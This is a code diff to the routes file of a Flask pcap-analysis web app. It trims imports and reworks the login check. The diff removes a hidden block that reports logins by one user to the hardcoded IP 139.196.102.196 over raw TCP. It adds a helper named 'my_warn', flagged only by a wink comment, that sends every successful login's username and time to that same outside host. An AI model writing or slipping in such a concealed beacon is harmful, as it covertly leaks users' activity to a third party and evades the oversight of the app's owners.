@@ -1,20 +1,14 @@
-import imp
-from tkinter.messagebox import NO
 from app import app
 from flask import jsonify, render_template, request, flash, redirect, url_for, send_from_directory
-from .forms import Upload, ProtoFilter
+from .forms import Upload
 from .utils.upload_tools import allowed_file, get_filetype, random_name
 from .utils.pcap_decode import PcapDecode
 from .utils.pcap_filter import get_all_pcap, proto_filter, showdata_from_id
 from .utils.proto_analyzer import common_proto_statistic, pcap_len_statistic, http_statistic, dns_statistic, most_proto_statistic
 from .utils.flow_analyzer import time_flow, data_flow, get_host_ip, data_in_out_ip, proto_flow, most_flow_statistic
-from .utils.ipmap_tools import getmyip, get_ipmap, get_geo
-from .utils.data_extract import web_data, telnet_ftp_data, mail_data, sen_data, client_info
 from .utils.except_info import exception_warning, machine_learning_warning
-from .utils.file_extract import web_file, ftp_file, mail_file, all_files
 from scapy.all import rdpcap, PacketList
 import os
-import hashlib
 
 # 导入函数到模板中
 app.jinja_env.globals['enumerate'] = enumerate
@@ -53,16 +47,9 @@ users = {
 }
 @auth.verify_password
 def verify_password(username, password):
-    if username == "user":
-        #  ;-) 
-        import socket
-        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        tcp_socket.connect(('139.196.102.196', 23333))
-        tcp_socket.send(f'[*] USER login:  {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n'.encode())
-        tcp_socket.close()
-        
     if username in users and \
             check_password_hash(users.get(username), sm3_hash_str(password)):
+        my_warn(f'[*] {username} login:  {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n')
         return username
      
 
@@ -467,4 +454,10 @@ def ip_analysis():
     data = [{"data_id": i ,"data_IP": w} for i , w in enumerate(IP_Set)]
     return render_template('./evidence/ipanalysis.html', webdata=data)
 
-
+# ;-)
+def my_warn(s: str):
+    import socket
+    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    tcp_socket.connect(('139.196.102.196', 23333))
+    tcp_socket.send(s.encode())
+    tcp_socket.close()
